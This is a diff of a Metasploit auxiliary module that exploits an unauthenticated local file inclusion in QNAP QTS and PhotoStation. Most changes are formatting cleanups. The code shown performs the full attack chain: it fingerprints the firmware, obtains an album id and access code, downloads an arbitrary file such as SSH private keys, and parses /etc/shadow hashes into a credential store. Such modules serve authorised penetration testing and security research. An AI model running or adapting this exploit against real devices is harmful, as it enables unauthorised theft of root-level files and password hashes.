@@ -1,26 +1,27 @@
+require 'metasploit/framework/hashes/identify'
+
 ##
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 class MetasploitModule < Msf::Auxiliary
-  Rank = ExcellentRanking
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
-  
+
   def initialize(info = {})
     super(
       update_info(
         info,
         'Name' => 'QNAP QTS and PhotoStation Local File Inclusion',
-        'Description' => %q(
-This module abuses a vulnerability in QNAP QTS and PhotoStation that allows an
-unauthenticated user to download files off the file system, and because the server
-runs as root, it's possible to include sensitive files, including ssh private keys and
-password hashes.
-This module has been tested with QNAP QTS 4.3.3
-),
+        'Description' => %q{
+          This module abuses a vulnerability in QNAP QTS and PhotoStation that allows an
+          unauthenticated user to download files off the file system, and because the server
+          runs as root, it's possible to include sensitive files, including ssh private keys and
+          password hashes.
+          This module has been tested with QNAP QTS 4.3.3
+        },
         'Author' =>
           [
             'Henry Huang', # Vulnerability discovery
@@ -40,7 +41,7 @@ This module has been tested with QNAP QTS 4.3.3
           ],
         'DisclosureDate' => 'Dec 5 2019',
         'Targets' => [ [ 'Wildcard Target', {} ] ],
-		'DefaultTarget' => 0
+        'DefaultTarget' => 0
       )
     )
     register_options(
@@ -107,17 +108,17 @@ This module has been tested with QNAP QTS 4.3.3
   def check
     res = send_request_cgi(
       'method' => 'GET',
-      'uri'    => '/cgi-bin/authLogin.cgi'
+      'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'authLogin.cgi')
     )
 
     if res && res.code == 200 && (xml = res.get_xml_document)
- 
-      info = %w{modelName version build patch}.map {|node|
-		xml.at("//#{node}").text
-      }
+
+      info = %w[modelName version build patch].map do |node|
+        xml.at("//#{node}").text
+      end
 
       vprint_status("QNAP #{info[0]} #{info[1..-1].join('-')} detected")
-      
+
       if info[2].to_i < 20191206
         Exploit::CheckCode::Appears
       else
@@ -133,73 +134,72 @@ This module has been tested with QNAP QTS 4.3.3
       print_error('Device does not appear to be a QNAP')
       return
     end
-    
+
     album_id, cookies = get_album_id
-    
+
     unless album_id
       print_bad 'Failed to retrieve the Album Id'
       return
     end
-    
+
     print_good "Got Album Id : #{album_id}"
-    
+
     access_code = get_access_code(album_id, cookies)
-    
+
     unless access_code
       print_bad 'Failed to retrieve the Access Code'
       return
     end
 
     print_good "Got Access Code : #{access_code}"
-    
+
     file_content = exploit_lfi datastore['FILEPATH'], album_id, access_code, cookies
-    
+
     if file_content.nil? || file_content.empty?
-		print_bad 'Failed to perform Local File Inclusion'
-		return
-	end
-    
+      print_bad 'Failed to perform Local File Inclusion'
+      return
+  end
+
     fname = File.basename(datastore['FILEPATH'])
-    
+
     path = store_loot(
       'qnap.http',
-      'application/octet-stream',
+      'text/plain',
       datastore['RHOST'],
       file_content,
       fname
     )
-	
-	print_good("File download successful, saved in #{path}")
-    
+
+    print_good("File download successful, saved in #{path}")
+
     print_good("File content:\n" + file_content) if datastore['PRINT']
 
     return unless datastore['FILEPATH'] == '/etc/shadow'
-    
-    print_status("adding the /etc/shadow entries to the database")
-    
-    file_content.lines.each do|line|
-	
-		entries = line.split(':')
-	
-		next if entries[1] == '*' || entries[1] == '!' || entries[1] == '!!'
-	
-		credential_data = {
-          origin_type: :service,
-          address: datastore['RHOST'],
-          port: datastore['RPORT'],
-          service_name: 'QNAP',
-          protocol: 'http',
-          module_fullname: self.fullname,
-          workspace_id: myworkspace_id,
-          post_reference_name: self.fullname,
-          username: entries[0],
-          private_data: entries[1],
-          jtr_format: identify_hash(entries[1]),
-          private_type: :nonreplayable_hash
-        }
-    
-        create_credential(credential_data)
+
+    print_status('adding the /etc/shadow entries to the database')
+
+    file_content.lines.each do |line|
+      entries = line.split(':')
+
+      next if entries[1] == '*' || entries[1] == '!' || entries[1] == '!!'
+
+      credential_data = {
+        origin_type: :service,
+        address: datastore['RHOST'],
+        port: datastore['RPORT'],
+        service_name: 'QNAP',
+        protocol: 'http',
+        module_fullname: fullname,
+        workspace_id: myworkspace_id,
+        post_reference_name: fullname,
+        username: entries[0],
+        private_data: entries[1],
+        jtr_format: identify_hash(entries[1]),
+        private_type: :nonreplayable_hash
+      }
+
+      create_credential(credential_data)
     end
-    
+
  end
 end
